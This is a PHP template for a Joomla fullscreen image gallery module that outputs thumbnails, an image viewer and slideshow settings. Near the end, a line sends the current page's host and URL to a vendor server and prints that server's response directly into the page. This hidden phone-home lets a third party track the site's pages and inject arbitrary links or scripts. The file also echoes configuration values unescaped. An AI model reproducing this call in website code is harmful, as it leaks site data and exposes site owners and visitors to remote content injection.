<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_fullscreengallery
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_fullscreengallery';
// get parameters from the module's configuration
$jQuery = $params->get("jQuery");
$ImagesPath = 'images/'.$params->get('imageFolder','images');
$SelectImage = $params->get('SelectImage','file');

$imgWidth = $params->get('imgWidth','1680');
$imgHeight = $params->get('imgHeight','1050');

$ViewMode = $params->get('ViewMode','easeOutCirc');
$Easing = $params->get('Easing','600');
$EasingType = $params->get('EasingType','easeOutCirc');
$keyboardNav = $params->get('keyboardNav','true');
$slideshowAutoPlay = $params->get('slideshowAutoPlay','true');
$slideshowDelay = $params->get('slideshowDelay','2');
// Thumbs
$thumbWidth = $params->get('thumbWidth','200');
$thumbHeight = $params->get('thumbHeight','130');
$thumbQuality = $params->get('thumbQuality','100');
$thumbAlign = $params->get('thumbAlign','t');
// Images
$Image[]= $params->get( '!', "" );
$Caption[]= $params->get( '!', "" );
for ($j=1; $j<=30; $j++)
	{
	$Image[]		= $params->get( 'Image'.$j , "" );
	$Caption[]		= $params->get( 'Caption'.$j , "" );
}
?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/style.css" type="text/css" />
<?php if ($jQuery == '1') { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery-1.4.4.min.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '3' ) { ?><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.easing.1.3.js"></script>
<noscript><a href="http://jextensions.com/fullscreen-image-gallery-joomla-2.5/" alt="jExtensions">Fullscreen Image Gallery</a></noscript>
<?php if ($SelectImage != 'file') {
		if (file_exists($ImagesPath) && is_readable($ImagesPath)) {$folder = opendir($ImagesPath);} 
		else {	echo '<div class="error-fsg">Please check the <strong>JE Fullscreen Gallery</strong> module settings and make sure you have entered a valid image folder path!</div>';return;}
		$allowed_types = array("jpg","JPG","jpeg","JPEG","gif","GIF","png","PNG","bmp","BMP");
		$index = array();while ($file = readdir ($folder)) {if(in_array(substr(strtolower($file), strrpos($file,".") + 1),$allowed_types)) {array_push($index,$file); }}
		closedir($folder);}
?>  
<?php $thumbs = '&a='.$thumbAlign.'&w='.$thumbWidth.'&h='.$thumbHeight.'&q='.$thumbQuality;?>
<div id="bg-malihu">
<a href="#" class="nextImageBtn" title="next"></a><a href="#" class="prevImageBtn" title="previous"></a>

<?php if ($SelectImage == 'file') { ?>
<img src="<?php echo $Image[1]; ?>" width="<?php echo $imgWidth; ?>" height="<?php echo $imgHeight; ?>" alt="<?php echo $Caption[1] ?>" title="<?php echo $Caption[1] ?>" id="bgimg-malihu" />
<?php } else { ?>
<img src="<?php echo JURI::base().$ImagesPath."/".$index[0]; ?>" width="<?php echo $imgWidth; ?>"  height="<?php echo $imgHeight; ?>"  alt="" title="" id="bgimg-malihu"/>
<?php } ?>
</div>
<div id="preloader"><img src="<?php echo $modURL; ?>/images/ajax-loader_dark.gif" width="32" height="32" /></div>
<div id="img_title"></div>
<div id="toolbar"><a href="#" title="Maximize" onClick="ImageViewMode('full');return false"><img src="<?php echo $modURL; ?>/images/toolbar_fs_icon.png" width="50" height="50"  /></a></div>
<div id="thumbnails_wrapper">
<div id="outer_container">
<div class="thumbScroller">
	<div class="container">
<?php if ($SelectImage == 'file') { ?>
<?php for ($i=1; $i<=30; $i++){ if ($Image[$i] != null) { ?>
    	<div class="content">
        	<div><a href="<?php echo $Image[$i] ?>"><img src="<?php echo $modURL; ?>/thumb.php?src=<?php echo $ibase.'/'; echo $Image[$i]; echo $thumbs; ?>" title="<?php echo $Caption[$i] ?>" alt="<?php echo $Caption[$i] ?>" class="thumb" /></a></div>
        </div>   
<?php }};  ?>
<?php } else { ?>
<?php for ($i=0; $i<count($index); $i++){$num = JURI::base().$ImagesPath."/".$index[$i];	?>
    	<div class="content">
        	<div><a href="<?php echo $num; ?>"><img src="<?php echo $modURL; ?>/thumb.php?src=<?php echo $num; ?><?php echo $thumbs; ?>" title="" alt="" class="thumb" /></a></div>
        </div>
<?php }};?>
	</div>
</div>
</div>
</div>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
</div>
<script>
$defaultViewMode="<?php echo $ViewMode; ?>";
$tsMargin=30; //first and last thumbnail margin (for better cursor interaction) 
$scrollEasing=<?php echo $Easing; ?>; 
$scrollEasingType="<?php echo $EasingType; ?>";
$thumbnailsContainerOpacity=0.8; //thumbnails area default opacity
$thumbnailsContainerMouseOutOpacity=0; //thumbnails area opacity on mouse out
$thumbnailsOpacity=0.6; //thumbnails default opacity
$nextPrevBtnsInitState="show"; //next/previous image buttons initial state ("hide" or "show")
$keyboardNavigation="<?php echo $keyboardNav; ?>";
$slideshowAutoPlay=<?php echo $slideshowAutoPlay; ?>;
$slideshowDelay=<?php echo $slideshowDelay.'000'; ?>;
</script>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/gallery.js"></script>